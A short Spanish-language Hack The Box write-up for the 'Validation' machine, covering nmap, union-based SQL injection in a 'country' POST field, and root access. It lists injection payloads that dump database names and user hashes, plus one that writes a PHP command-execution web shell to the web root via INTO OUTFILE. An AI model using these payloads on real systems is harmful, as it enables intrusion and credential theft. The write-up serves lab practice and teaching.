# Validation-HTB


## NMAP

![image](https://github.com/gecr07/Validation-HTB/assets/63270579/8916ebb6-7333-4fda-a63d-8beef53db1f4)

## RCE

Lo unico a lo que podiamos llegar es a

![image](https://github.com/gecr07/Validation-HTB/assets/63270579/4d7fdc0d-e7ef-4de7-8635-5ea9d1c11dcc)


Con el burpsuite tenia una peticion post la cual es vulnerable a SQLI en el parametro de Country


```
username=masa&country=Albania' union select user();-- -

username=masa&country=Albania' union select database();-- -

username=masa&country=Albania' union select table_name from information_schema.tables where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -

username=masa&country=Albania' union select group_concat(username,0x3a,userhash) from registration;-- -

0x3a son los dos puntos
```

Pero lo importante estuvo en los permisos.

![image](https://github.com/gecr07/Validation-HTB/assets/63270579/98891f30-8629-4914-9ed5-7e289bd18fc6)

Pero lo intenresante es que el usuario tenia permisos de escribir un archivo.

![image](https://github.com/gecr07/Validation-HTB/assets/63270579/24a6326c-1188-4f3b-be0d-a236cf8d2e51)

Esto nos indica que ese usuario puede escribir archivos entonces escribimos una shell y la visitamos y ejecutamos comandos.

```
username=masa&country=Albania' union select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/r.php";-- -
```

## Priv Esc

![image](https://github.com/gecr07/Validation-HTB/assets/63270579/117450fa-e477-4fdd-8a9d-19222ee5abce)

Busque y no enocntre nada asi que probe si era la credencial de root y pues si...








